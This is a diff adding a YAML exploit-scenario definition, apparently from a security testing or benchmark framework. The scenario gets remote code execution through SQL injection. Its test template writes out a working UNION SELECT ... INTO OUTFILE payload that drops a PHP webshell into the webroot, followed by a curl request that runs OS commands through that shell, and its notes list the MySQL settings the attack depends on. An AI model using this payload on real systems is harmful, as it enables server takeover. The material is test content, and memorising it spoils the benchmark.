@@ -1,0 +1,23 @@
+id: rce_via_sqli
+description: >
+  Achieve remote code execution by using a UNION-based SQL injection with MySQL's
+  INTO OUTFILE directive to write a PHP webshell directly to the webroot, then
+  requesting the written file to execute OS commands.
+compatible_vuln_patterns:
+  - sqli_union
+success_criteria:
+  description: >
+    After injecting the INTO OUTFILE payload, an HTTP request to the written
+    webshell URL with a cmd parameter returns OS command output.
+  output_pattern: 'uid=\d+|gid=\d+|www-data'
+test_template: |
+  # Step 1: write webshell via SQLi
+  curl -s "http://target:{{port}}/{{endpoint}}?{{input_parameter}}=x'+UNION+SELECT+'<?php+system(\$_GET[\"cmd\"]);+?>',2+INTO+OUTFILE+'/var/www/html/goe_shell.php'--+-"
+  # Step 2: execute via webshell
+  curl -s "http://target:{{port}}/goe_shell.php?cmd=id" \
+    | grep -E 'uid=[0-9]+'
+notes: >
+  Requires Apache/PHP runtime with MySQL. MySQL must be configured with
+  secure_file_priv="" to allow INTO OUTFILE writes to the webroot. The setup_db.sh
+  must set this in /etc/mysql/mysql.conf.d/mysqld.cnf before starting MySQL.
+  The MySQL app user needs the FILE privilege.
